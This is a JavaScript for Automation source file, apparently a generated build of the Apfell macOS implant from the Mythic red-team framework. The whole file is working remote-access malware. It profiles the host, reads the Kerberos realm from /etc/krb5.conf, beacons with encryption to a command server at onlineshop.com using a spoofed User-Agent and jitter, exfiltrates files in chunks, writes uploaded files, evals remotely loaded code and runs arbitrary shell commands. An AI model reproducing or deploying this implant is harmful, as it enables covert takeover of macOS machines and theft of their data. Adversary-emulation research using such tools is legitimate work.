// Created by Cody Thomas - @its_a_feature_
ObjC.import('Cocoa');
ObjC.import('Foundation'); //there by default I think, but safe to include anyway
ObjC.import('stdlib');
ObjC.bindFunction('CFMakeCollectable', ['id', ['void *'] ]);
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;
//--------------IMPLANT INFORMATION-----------------------------------
class agent{
	constructor(){
		this.procInfo = $.NSProcessInfo.processInfo;
		this.hostInfo = $.NSHost.currentHost;
		this.id = "";
		this.user = ObjC.deepUnwrap(this.procInfo.userName);
		this.fullName = ObjC.deepUnwrap(this.procInfo.fullUserName);
		//every element in the array needs to be unwrapped
		this.ip = ObjC.deepUnwrap(this.hostInfo.addresses).sort().filter(i => i !== "127.0.0.1"); //probably just need [0]
		this.pid = this.procInfo.processIdentifier;
		//every element in the array needs to be unwrapped
		this.host = ObjC.deepUnwrap(this.hostInfo.names); //probably just need [0]
		//this is a dictionary, but every 'value' needs to be unwrapped
		this.environment = ObjC.deepUnwrap(this.procInfo.environment);
		this.uptime = this.procInfo.systemUptime;
		//every element in the array needs to be unwrapped
		this.args = ObjC.deepUnwrap(this.procInfo.arguments);
		this.osVersion = this.procInfo.operatingSystemVersionString.js;
		this.uuid = "6251ecac-e930-4c8a-b001-067b92b7da30";
        this.checked_in = false;
	}
}
var apfell = new agent();
//--------------Base C2 INFORMATION----------------------------------------
class baseC2{
	//To create your own C2, extend this class and implement the required functions
	//The main code depends on the mechanism being C2 with these functions.
	//   the implementation of the functions doesn't matter though
	//   You're welcome to add additional functions as well, but this is the minimum
	constructor(interval, baseurl){
		this.interval = interval; //seconds between callbacks
		this.baseurl = baseurl; //where to reach out to
		this.commands = [];
	}
	checkin(){
		//check in with c2 server
	}
	getTasking(){
		//reach out to wherever to get tasking
	}
	getConfig(){
		//gets the current configuration for tasking
	}
	postResponse(task, output){
		//output a response to a task
	}
	setConfig(params){
		//updates the current configuration for how to get tasking
	}
	download(task, params){
	    //gets a file from the apfell server in some way
	}
	upload(task, params){
	    //uploads a file in some way to the teamserver
	}
}
//-------------RESTFUL C2 mechanisms ---------------------------------
class customC2 extends baseC2{
	constructor(interval, cback_host, cback_port){
		if(cback_port === "443" && cback_host.includes("https://")){
			super(interval, cback_host);
		}else if(cback_port === "80" && cback_host.includes("http://")){
			super(interval, cback_host);
		}else{
			let last_slash = cback_host.indexOf("/", 8);
			if(last_slash === -1){
				//there is no 3rd slash
				super(interval, cback_host + ":" + cback_port);
			}else{
				//there is a 3rd slash, so we need to splice in the port
				super(interval,cback_host.substring(0, last_slash) + ":" + cback_port + "/" + cback_host.substring(last_slash))
			}
		}
		this.commands = [];
		this.url = this.baseurl;
		this.getURI = "index";
		this.postURI = "data";
		this.queryPathName = "q";
		this.proxyURL = "";
		this.proxyPort = "";
		this.proxyUser = "";
		this.proxyPassword = "";
		this.proxy_dict = {};
		if(this.proxyURL !== ""){
			if(this.proxyURL.includes("https")) {
				this.proxy_dict["HTTPSEnable"] = 1;
				this.proxy_dict["HTTPSProxy"] = this.proxyURL;
				this.proxy_dict["HTTPSPort"] = parseInt(this.proxyPort);
			}else{
				this.proxy_dict["HTTPEnable"] = 1;
				this.proxy_dict["HTTPProxy"] = this.proxyURL;
				this.proxy_dict["HTTPPort"] = parseInt(this.proxyPort);
			}
		}
		if(this.proxyUser !== ""){
			this.proxy_dict["kCFProxyUsernameKey"] = this.proxyUser;
		}
		if(this.proxyPassword !== ""){
			this.proxy_dict["kCFProxyPasswordKey"] = this.proxyPassword;
		}
		this.jitter = 23;
		this.header_list = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"};
		this.aes_psk = "mJIW30BwyihLEAZmf1A1QJDY+ygNsN3pZx3IzupPkyU="; // base64 encoded key
		if(this.aes_psk !== ""){
			this.parameters = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
			$.CFDictionarySetValue(this.parameters, $.kSecAttrKeyType, $.kSecAttrKeyTypeAES);
			$.CFDictionarySetValue(this.parameters, $.kSecAttrKeySizeInBits, $.kSecAES256);
			$.CFDictionarySetValue(this.parameters, $.kSecAttrKeyClass, $.kSecAttrKeyClassSymmetric);
			$.CFDictionarySetValue(this.parameters, $.kSecClass, $.kSecClassKey);
			this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
			let err = Ref();
			this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, err);
		}
		this.using_key_exchange = "true" === "true";
		this.exchanging_keys = this.using_key_exchange;
		if("2025-12-10" !== "yyyy-mm-dd" && "2025-12-10" !== ""){
			this.dateFormatter = $.NSDateFormatter.alloc.init;
			this.dateFormatter.setDateFormat("yyyy-MM-dd");
			this.kill_date = this.dateFormatter.dateFromString('2025-12-10');
		}else{
			this.kill_date = $.NSDate.distantFuture;
		}
	}
	get_random_int(max) {
		return Math.floor(Math.random() * Math.floor(max + 1));
	}
	gen_sleep_time(){
		//generate a time that's this.interval += (this.interval * 1/this.jitter)
		if(this.jitter < 1){return this.interval;}
		let plus_min = this.get_random_int(1);
		if(plus_min === 1){
			return this.interval + (this.interval * (this.get_random_int(this.jitter)/100));
		}else{
			return this.interval - (this.interval * (this.get_random_int(this.jitter)/100));
		}
	}
	encrypt_message(uid, data){
		// takes in the string we're about to send, encrypts it, and returns a new string
		let err = Ref();
		let encrypt = $.SecEncryptTransformCreate(this.cryptokey,err);
		let b = $.SecTransformSetAttribute(encrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
		b= $.SecTransformSetAttribute(encrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);

		//generate a random IV to use
		let IV = $.NSMutableData.dataWithLength(16);
		$.SecRandomCopyBytes($.kSecRandomDefault, 16, IV.bytes);
		b = $.SecTransformSetAttribute(encrypt, $("SecIVKey"), IV, err);
		// set our data to be encrypted
		let nsdata = $(data).dataUsingEncoding($.NSUTF8StringEncoding);
		b=$.SecTransformSetAttribute(encrypt, $.kSecTransformInputAttributeName, nsdata, err);
		//$.CFShow(err[0]);
		let encryptedData = $.SecTransformExecute(encrypt, err);
		// now we need to prepend the IV to the encrypted data before we base64 encode and return it
		//generate the hmac
		let hmac_transform = $.SecDigestTransformCreate($("HMAC-SHA2 Digest Family"), 256, err);
		let hmac_input = $.NSMutableData.dataWithLength(0);
		hmac_input.appendData(IV);
		hmac_input.appendData(encryptedData);
		b=$.SecTransformSetAttribute(hmac_transform, $.kSecTransformInputAttributeName, hmac_input, err);
		b=$.SecTransformSetAttribute(hmac_transform, $.kSecDigestHMACKeyAttribute, $.NSData.alloc.initWithBase64Encoding(this.aes_psk), err);
		let hmac_data = $.SecTransformExecute(hmac_transform, err);

		let final_message = $.NSMutableData.dataWithLength(0);
		final_message.appendData( $(uid).dataUsingEncoding($.NSUTF8StringEncoding) );
		final_message.appendData(IV);
		final_message.appendData(encryptedData);
		final_message.appendData(hmac_data);
		return final_message.base64EncodedStringWithOptions(0);
	}
	decrypt_message(nsdata){
		//takes in a base64 encoded string to be decrypted and returned
		//console.log("called decrypt");
		let err = Ref();
		let decrypt = $.SecDecryptTransformCreate(this.cryptokey, err);
		$.SecTransformSetAttribute(decrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
		$.SecTransformSetAttribute(decrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);
		//console.log("making ranges");
		//need to extract out the first 16 bytes as the IV and the rest is the message to decrypt
		let iv_range = $.NSMakeRange(0, 16);
		let message_range = $.NSMakeRange(16, nsdata.length - 48); // 16 for IV 32 for hmac
		let hmac_range = $.NSMakeRange(nsdata.length - 32, 32);
		let hmac_data_range = $.NSMakeRange(0, nsdata.length - 32); // hmac includes IV + ciphertext
		//console.log("carving out iv");
		let iv = nsdata.subdataWithRange(iv_range);
		$.SecTransformSetAttribute(decrypt, $("SecIVKey"), iv, err);
		let message = nsdata.subdataWithRange(message_range);
		$.SecTransformSetAttribute(decrypt, $("INPUT"), message, err);
		// create an hmac and verify it matches
		let message_hmac = nsdata.subdataWithRange(hmac_range);
		let hmac_transform = $.SecDigestTransformCreate($("HMAC-SHA2 Digest Family"), 256, err);
		$.SecTransformSetAttribute(hmac_transform, $.kSecTransformInputAttributeName, nsdata.subdataWithRange(hmac_data_range), err);
		$.SecTransformSetAttribute(hmac_transform, $.kSecDigestHMACKeyAttribute, $.NSData.alloc.initWithBase64Encoding(this.aes_psk), err);
		let hmac_data = $.SecTransformExecute(hmac_transform, err);
		if(hmac_data.isEqualToData(message_hmac)){
			let decryptedData = $.SecTransformExecute(decrypt, Ref());
			//console.log("making a string from the message");
			let decrypted_message = $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
			//console.log(decrypted_message.js);
			return decrypted_message;
		}
		else{
			return undefined;
		}
	}
	negotiate_key(){
		// Generate a public/private key pair
		let parameters = $({"type": $("42"), "bsiz": 4096, "perm": false});
		let err = Ref();
		let privatekey = $.SecKeyCreateRandomKey(parameters, err);
		//console.log("generated new key");
		let publickey = $.SecKeyCopyPublicKey(privatekey);
		let exported_public = $.SecKeyCopyExternalRepresentation(publickey, err);
		//$.CFShow($.CFMakeCollectable(err[0]));
		try{
			//this is the catalina case
			let b64_exported_public = $.CFMakeCollectable(exported_public);
			b64_exported_public = b64_exported_public.base64EncodedStringWithOptions(0).js; // get a base64 encoded string version
			exported_public = b64_exported_public;
		}catch(error){
			//this is the mojave and high sierra case
			exported_public = exported_public.base64EncodedStringWithOptions(0).js;
		}
		let s = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		let session_key = Array(20).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
		let initial_message = {"session_id": session_key, "pub_key": exported_public, "action": "staging_rsa"};
		// Encrypt our initial message with sessionID and Public key with the initial AES key
		while(true){
			try{
				let stage1 = this.htmlPostData(initial_message, apfell.uuid);
				let enc_key = $.NSData.alloc.initWithBase64Encoding(stage1['session_key']);
				let dec_key = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, enc_key, err);
				// Adjust our global key information with the newly adjusted session key
				try{
					this.aes_psk = dec_key.base64EncodedStringWithOptions(0).js; // base64 encoded key
				}catch(error){
					let dec_key_collectable = $.CFMakeCollectable(dec_key);
					dec_key_collectable = dec_key_collectable.base64EncodedStringWithOptions(0).js;
					this.aes_psk = dec_key_collectable;
				}
				//console.log(JSON.stringify(json_response));
				this.parameters = $({"type": $.kSecAttrKeyTypeAES});
				this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
				this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
				this.exchanging_keys = false;
				return stage1['uuid'];
			}catch(error){
				console.log(error.toString());
				$.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
			}
		}
	}
	getConfig(){
		//A RESTful base config consists of the following:
		//  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
		let config = {
			"C2": {
				"baseurl": this.baseurl,
				"interval": this.interval,
				"jitter": this.jitter,
				"commands": this.commands.join(", "),
				"api_version": this.api_version,
				"header_list": this.header_list,
				"aes_psk": this.aes_psk
			},
			"Host": {
				"user": apfell.user,
				"fullName": apfell.fullName,
				"ips": apfell.ip,
				"hosts": apfell.host,
				"environment": apfell.environment,
				"uptime": apfell.uptime,
				"args": apfell.args,
				"pid": apfell.pid,
				"apfell_id": apfell.id,
				"payload_id": apfell.uuid
			}};
		return JSON.stringify(config, null, 2);
	}
	checkin(ip, pid, user, host, os, arch, domain){
		//get info about system to check in initially
		//needs IP, PID, user, host, payload_type
		let info = {'ips':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os":os, "architecture": arch, "domain": domain, "action": "checkin"};
		info["process_name"] = apfell.procInfo.processName.js;
		info["sleep_info"] = "Sleep interval set to " + C2.interval + " and sleep jitter updated to " + C2.jitter;
		if(user === "root"){
			info['integrity_level'] = 3;
		}
		//calls htmlPostData(url,data) to actually checkin
		//Encrypt our data
		//gets back a unique ID
		if(this.using_key_exchange){
			let sessionID = this.negotiate_key();
			//console.log("got session ID: " + sessionID);
			var jsondata = this.htmlPostData(info, sessionID);
		}else{
			var jsondata = this.htmlPostData(info, apfell.uuid);
		}
		apfell.id = jsondata.id;
		apfell.checked_in = true;
		// if we fail to get a new ID number, then exit the application
		if(apfell.id === undefined){ $.NSApplication.sharedApplication.terminate(this); }
		//console.log(apfell.id);
		return jsondata;
	}
	getTasking(){
		for(let i = 0; i < 10; i++){
			try{
				//let data = {"tasking_size":1, "action": "get_tasking"};
				//let task = this.htmlPostData(this.url, data, apfell.id);
				let task = this.htmlGetData();
				//console.log("tasking got back: " + JSON.stringify(task));
				return task['tasks'];
			}
			catch(error){
				//console.log(error.toString());
				$.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
			}
		}
		return [];
	}
	postResponse(task, output){
		// this will get the task object and the response output
		return this.postRESTResponse(output, task.id);
	}
	postRESTResponse(data, tid){
		//depending on the amount of data we're sending, we might need to chunk it
		data["task_id"] =  tid;
		let postData = {"action": "post_response", "responses": [data]};
		return this.htmlPostData(postData, apfell.id);
	}
	htmlPostData(sendData, uid, json=true){
		let url = this.baseurl;
		if(this.postURI !== ""){ url += "/" + this.postURI;}
		//console.log(url);
		//encrypt our information before sending it
		let data;
		if(this.aes_psk !== ""){
			data = this.encrypt_message(uid, JSON.stringify(sendData));
		}else if(typeof(sendData) === "string"){
			data = $(uid + sendData).dataUsingEncoding($.NSUTF8StringEncoding);
			data = data.base64EncodedStringWithOptions(0);
		}else{
			data = $(uid + JSON.stringify(sendData)).dataUsingEncoding($.NSUTF8StringEncoding);
			data = data.base64EncodedStringWithOptions(0);
		}
		for(let i = 0; i < 10; i++){
			if(!apfell.checked_in){i = 0;}
			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
				//console.log("posting: " + sendData + " to " + urlEnding);
				if( $.NSDate.date.compare(this.kill_date) === $.NSOrderedDescending ){
					$.NSApplication.sharedApplication.terminate(this);
				}
				if( (apfell.id === undefined || apfell.id === "") && (uid === undefined || uid === "")){ $.NSApplication.sharedApplication.terminate(this);}
				let req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
				let postData = data.dataUsingEncodingAllowLossyConversion($.NSASCIIStringEncoding, true);
				let postLength = $.NSString.stringWithFormat("%d", postData.length);
				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
				for(let key in this.header_list){
					req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.header_list[key]), $.NSString.alloc.initWithUTF8String(key));
				}
				req.setHTTPBody(postData);
				let response = Ref();
				let error = Ref();
				let session_config = $.NSURLSessionConfiguration.ephemeralSessionConfiguration;
				if(Object.keys(this.proxy_dict).length > 0){
					session_config.connectionProxyDictionary = $(this.proxy_dict);
				}
				let session = $.NSURLSession.sessionWithConfiguration(session_config);
				let finished = false;
				let responseData;
				session.dataTaskWithRequestCompletionHandler(req, (data, resp) => {
					finished = true;
					responseData = data;
				}).resume;
				while(!finished){
					delay(0.1);
				}
				//responseData is base64(UUID + data)
				if( responseData.length < 36){
					$.NSThread.sleepForTimeInterval(this.gen_sleep_time());
					continue;
				}
				let resp = $.NSData.alloc.initWithBase64Encoding(responseData);
				//let uuid_range = $.NSMakeRange(0, 36);
				let message_range = $.NSMakeRange(36, resp.length - 36);
				//let uuid = $.NSString.alloc.initWithDataEncoding(resp.subdataWithRange(uuid_range), $.NSUTF8StringEncoding).js;
				resp = resp.subdataWithRange(message_range); //could either be plaintext json or encrypted bytes
				//we're not doing the initial key exchange
				if(this.aes_psk !== ""){
					//if we do need to decrypt the response though, do that
					if(json){
						resp = ObjC.unwrap(this.decrypt_message(resp));
						return JSON.parse(resp);
					}else{
						return this.decrypt_message(resp);
					}
				}else{
					//we don't need to decrypt it, so we can just parse and return it
					if(json){
						return JSON.parse(ObjC.deepUnwrap($.NSString.alloc.initWithDataEncoding(resp, $.NSUTF8StringEncoding)));
					}else{
						return $.NSString.alloc.initWithDataEncoding(resp, $.NSUTF8StringEncoding).js;
					}
				}
			}
			catch(error){
				//console.log(error.toString());
				$.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
			}

		}
		return {};
	}
	htmlGetData(){
		let data = {"tasking_size":1, "action": "get_tasking"};
		if(this.aes_psk !== ""){
			data = this.encrypt_message(apfell.id, JSON.stringify(data));
		}else{
			data = $(apfell.id + JSON.stringify(data)).dataUsingEncoding($.NSUTF8StringEncoding);
			data = data.base64EncodedStringWithOptions(0);
		}
		data = data.stringByReplacingOccurrencesOfStringWithString($("/"), $("_"))
		data = data.stringByReplacingOccurrencesOfStringWithString($("+"), $("-")).js
		let url = this.baseurl;
		if(this.getURI !== ""){ url += "/" + this.getURI; }
		url += "?" + this.queryPathName + "=" + data;
		for(let i = 0; i < 10; i++){
			if(!apfell.checked_in){i = 0}
			try{
				if( $.NSDate.date.compare(this.kill_date) === $.NSOrderedDescending ){
					$.NSApplication.sharedApplication.terminate(this);
				}
				if(apfell.id === undefined || apfell.id === ""){ $.NSApplication.sharedApplication.terminate(this);}
				let req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("GET"));
				for(let key in this.header_list){
					req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.header_list[key]), $.NSString.alloc.initWithUTF8String(key));
				}
				let response = Ref();
				let error = Ref();
				let session_config = $.NSURLSessionConfiguration.ephemeralSessionConfiguration;
				session_config.connectionProxyDictionary = $(this.proxy_dict);
				let session = $.NSURLSession.sessionWithConfiguration(session_config);
				let finished = false;
				let responseData;
				session.dataTaskWithRequestCompletionHandler(req, (data, resp) => {
					finished = true;
					responseData = data;
				}).resume;
				while(!finished){
					delay(0.1);
				}
				if(responseData.length < 36){
					//this means we likely got back some form of error or redirect message, not our actual data
					$.NSThread.sleepForTimeInterval(this.gen_sleep_time());
					continue;
				}
				let resp = $.NSData.alloc.initWithBase64Encoding(responseData);
				//let uuid_range = $.NSMakeRange(0, 36);
				let message_range = $.NSMakeRange(36, resp.length - 36);
				//let uuid = $.NSString.alloc.initWithDataEncoding(resp.subdataWithRange(uuid_range), $.NSUTF8StringEncoding).js;
				resp = resp.subdataWithRange(message_range); //could either be plaintext json or encrypted bytes
				//we're not doing the initial key exchange
				if(this.aes_psk !== ""){
					//if we do need to decrypt the response though, do that
					resp = ObjC.unwrap(this.decrypt_message(resp));
					return JSON.parse(resp);
				}else{
					//we don't need to decrypt it, so we can just parse and return it
					return JSON.parse(ObjC.deepUnwrap($.NSString.alloc.initWithDataEncoding(resp, $.NSUTF8StringEncoding)));
				}
			}
			catch(error){
				//console.log("error in htmlGetData: " + error.toString());
				$.NSThread.sleepForTimeInterval(this.gen_sleep_time()); //wait timeout seconds and try again
			}
		}
		return {};
	}
	download(task, params){
		// download just has one parameter of the path of the file to download
		let output = "";
		if( does_file_exist(params) ){
			let offset = 0;
			let chunkSize = 512000; //3500;
			// get the full real path to the file
			let full_path = params;
			try{
				let fm = $.NSFileManager.defaultManager;
				let pieces = ObjC.deepUnwrap(fm.componentsToDisplayForPath(params));
				full_path = "/" + pieces.slice(1).join("/");
				var handle = $.NSFileHandle.fileHandleForReadingAtPath(full_path);
				if(handle.js === undefined){
					return {"status": "error", "user_output": "Access denied or path was to a folder", "completed": true};
				}
				// Get the file size by seeking;
				var fileSize = handle.seekToEndOfFile;
			}catch(error){
				return {'status': 'error', 'user_output': error.toString(), 'completed': true};
			}
			// always round up to account for chunks that are < chunksize;
			let numOfChunks = Math.ceil(fileSize / chunkSize);
			let registerData = {"download": {'total_chunks': numOfChunks, 'full_path': full_path}};
			let registerFile = this.postResponse(task, registerData);
			registerFile = registerFile['responses'][0];
			if (registerFile['status'] === "success"){
				this.postResponse(task, {"user_output": JSON.stringify({
						"agent_file_id": registerFile["file_id"],
						"total_chunks": numOfChunks
					})});
				handle.seekToFileOffset(0);
				let currentChunk = 1;
				let data = handle.readDataOfLength(chunkSize);
				while(parseInt(data.length) > 0 && offset < fileSize){
					// send a chunk
					let fileData = {"download": {
							'chunk_num': currentChunk,
							'chunk_data': data.base64EncodedStringWithOptions(0).js,
							'file_id': registerFile['file_id']
						}
					};
					this.postResponse(task, fileData);
					$.NSThread.sleepForTimeInterval(this.gen_sleep_time());
					// increment the offset and seek to the amount of data read from the file
					offset += parseInt(data.length);
					handle.seekToFileOffset(offset);
					currentChunk += 1;
					data = handle.readDataOfLength(chunkSize);
				}
				output = {"completed":true, "user_output": `{"file_id": "${registerFile['file_id']}", "completed": true}`, "file_id": registerFile['file_id']};
			}
			else{
				output = {'status': 'error', 'user_output': "Failed to register file to download", 'completed': true};
			}
		}
		else{
			output = {'status': 'error', 'user_output': "file does not exist", 'completed': true};
		}
		return output;
	}
	upload(task, file_id, full_path){
		try{
			let data = {"action": "post_response", "responses":[
					{"upload": {"file_id": file_id, "chunk_size": 512000, "chunk_num": 1, "full_path": full_path}, "task_id": task.id},
				]};
			let chunk_num = 1;
			let total_chunks = 1;
			let total_data = $.NSMutableData.dataWithLength(0);
			do{
				let file_data = this.htmlPostData(data, apfell.id);
				if(file_data["responses"][0]['chunk_num'] === 0){
					return "error from server";
				}
				chunk_num = file_data["responses"][0]['chunk_num'];
				total_chunks = file_data["responses"][0]['total_chunks'];
				total_data.appendData($.NSData.alloc.initWithBase64Encoding($(file_data["responses"][0]['chunk_data'])));
				data = {"action": "post_response", "responses":[
						{"upload": {"file_id": file_id, "chunk_size": 512000, "chunk_num": chunk_num + 1}, "task_id": task.id}
					]};
			}while(chunk_num < total_chunks);
			return total_data;
		}catch(error){
			return error.toString();
		}
	}
}
//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
ObjC.import('Security');
var C2 = new customC2(10, "http://onlineshop.com", "80");
//-------------SHARED COMMAND CODE ------------------------
does_file_exist = function(strPath){
    var error = $();
    return $.NSFileManager.defaultManager.attributesOfItemAtPathError($(strPath).stringByStandardizingPath, error), error.code === undefined;
};
convert_to_nsdata = function(strData){
    // helper function to convert UTF8 strings to NSData objects
    var tmpString = $.NSString.alloc.initWithCStringEncoding(strData, $.NSUTF8StringEncoding);
    return tmpString.dataUsingEncoding($.NSUTF8StringEncoding);
};
write_data_to_file = function(data, file_path){
    try{
        //var open_file = currentApp.openForAccess(Path(file_path), {writePermission: true});
        //currentApp.setEof(open_file, { to: 0 }); //clear the current file
        //currentApp.write(data, { to: open_file, startingAt: currentApp.getEof(open_file) });
        //currentApp.closeAccess(open_file);
        if(typeof data == "string"){
            data = convert_to_nsdata(data);
        }
        if (data.writeToFileAtomically($(file_path), true)){
            return "file written";
        }
        else{
            return "failed to write file";
        }
     }
     catch(error){
        return "failed to write to file: " + error.toString();
     }
};
default_load = function(contents){
    var module = {exports: {}};
    var exports = module.exports;
    if(typeof contents == "string"){
        eval(contents);
    }
    else{
        eval(contents.js);
    }
    return module.exports;
};
base64_decode = function(data){
    if(typeof data == "string"){
        var ns_data = $.NSData.alloc.initWithBase64Encoding($(data));
    }
    else{
        var ns_data = data;
    }
    var decoded_data = $.NSString.alloc.initWithDataEncoding(ns_data, $.NSUTF8StringEncoding).js;
    return decoded_data;
};
base64_encode = function(data){
    if(typeof data == "string"){
        var ns_data = convert_to_nsdata(data);
    }
    else{
        var ns_data = data;
    }
    var encoded = ns_data.base64EncodedStringWithOptions(0).js;
    return encoded;
};
var exports = {};  // get stuff ready for initial command listing
exports.download = function(task, command, params){
    try{
    	if(params === "" || params === undefined){return {'user_output': "Must supply a path to a file to download", "completed": true, "status": "error"}; }
        return C2.download(task, params);
    }catch(error){
        return {'user_output': error.toString(), "completed": true, "status": "error"};
    }
};

exports.upload = function(task, command, params){
    try{
        let config = JSON.parse(params);
        let full_path  = config['remote_path'];
        let data = "Can't find 'file' or 'file_id' with non-blank values";
        let file_id = "";
        if(config.hasOwnProperty('file') && config['file'] !== ""){
            data = C2.upload(task, config['file'], "");
            file_id = config['file']
        }
        if(typeof data === "string"){
            return {"user_output":String(data), "completed": true, "status": "error"};
        }
        else{
            data = write_data_to_file(data, full_path);
            try{
                let fm = $.NSFileManager.defaultManager;
                let pieces = ObjC.deepUnwrap(fm.componentsToDisplayForPath(full_path));
                if(pieces === undefined){
                    return {'status': 'error', 'user_output': String(data), 'completed': true};
                }
                full_path = "/" + pieces.slice(1).join("/");
            }catch(error){
                return {'status': 'error', 'user_output': error.toString(), 'completed': true};
            }
            return {"user_output":String(data), "completed": true, "upload": {'full_path': full_path, "file_id": file_id},
                "artifacts": [{"base_artifact": "File Create", "artifact": full_path}]};
        }
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.exit = function(task, command, params){
    ObjC.import("AppKit");
    C2.postResponse(task, {"completed": true, "user_output": "Exiting"});
    $.NSApplication.sharedApplication.terminate($.nil);
    $.NSThread.exit();
};

exports.load = function(task, command, params){
    //base64 decode the params and pass it to the default_load command
    //  params should be {"cmds": "cmd1 cmd2 cmd3", "file_id": #}
    try{
        let parsed_params = JSON.parse(params);
        let code = C2.upload(task, parsed_params['file_id'], "");
        if(typeof code === "string"){
            return {"user_output":String(code), "completed": true, "status": "error"};
            //something failed, we should have NSData type back
        }
        let new_dict = default_load(base64_decode(code));
        commands_dict = Object.assign({}, commands_dict, new_dict);
        // update the config with our new information
        C2.commands = Object.keys(commands_dict);
        let cmd_list = [];
        for(let i = 0; i < parsed_params['commands'].length; i++){
            cmd_list.push({"action": "add", "cmd": parsed_params['commands'][i]})
        }
        return {"user_output": "Loaded " + parsed_params['commands'], "commands": cmd_list, "completed": true};
    }
    catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.shell = function(task, command, params){
	//simply run a shell command via doShellScript and return the response
	let response = "";
	try{
		let command_params = JSON.parse(params);
		let command = command_params['command'];
	    if(command[command.length-1] === "&"){
	        //doShellScript actually does macOS' /bin/sh which is actually bash emulating sh
	        //  so to actually background a task, you need "&> /dev/null &" at the end
	        //  so I'll just automatically fix this so it's not weird for the operator
	        command = command + "> /dev/null &";
	    }
		response = currentApp.doShellScript(command);
		if(response === undefined || response === ""){
		    response = "No Command Output";
		}
		// shell output uses \r instead of \n or \r\n to line endings, fix this nonsense
		response = response.replace(/\r/g, "\n");
		return {"user_output":response, "completed": true};
	}
	catch(error){
		response = error.toString().replace(/\r/g, "\n");
		return {"user_output":response, "completed": true, "status": "error"};
	}
};


//console.log("about to load commands");
var commands_dict = exports;
var jsimport = "";

//-------------GET IP AND CHECKIN ----------------------------------
if( $.NSDate.date.compare(C2.kill_date) === $.NSOrderedDescending ){
  $.NSApplication.sharedApplication.terminate(this);
}
let ip_found = false;
C2.commands =  Object.keys(commands_dict);
let domain = "";
if(does_file_exist("/etc/krb5.conf")){
    let contents = $.NSString.stringWithContentsOfFileEncodingError("/etc/krb5.conf", $.NSUTF8StringEncoding, $.nil).js;
    contents = contents.split("\n");
    for(let j = 0; j < contents.length; j++){
        if(contents[j].includes("default_realm")){
            domain = contents[j].split("=")[1].trim();
        }
    }
}
C2.checkin(apfell.ip,apfell.pid,apfell.user,ObjC.unwrap(apfell.procInfo.hostName),apfell.osVersion, "x64", domain);
//---------------------------MAIN LOOP ----------------------------------------
function sleepWakeUp(){
    while(true){
        $.NSThread.sleepForTimeInterval(C2.gen_sleep_time());
        let output = "";
        let task = C2.getTasking();
        //console.log(JSON.stringify(task));
        let command = "";
        try{
        	//console.log(JSON.stringify(task));
        	if(task.length === 0){
        		continue;
        	}
        	task = task[0];
        	//console.log(JSON.stringify(task));
            command = task["command"];
            try{
                output = commands_dict[command](task, command, task['parameters']);
            }
            catch(error){
                if(error.toString().includes("commands_dict[command] is not a function")){
                    output ={"user_output": "Unknown command: " + command, "status": "error", "completed": true};
                }
                else{
                    output = {"user_output": error.toString(), "status": "error", "completed": true};
                }
            }
            C2.postResponse(task, output);
        }
        catch(error){
            C2.postResponse(task, {"user_output": error.toString(), "status": "error", "completed": true});
        }
        //task["command"] = "none"; //reset just in case something goes weird
    }
}
sleepWakeUp();
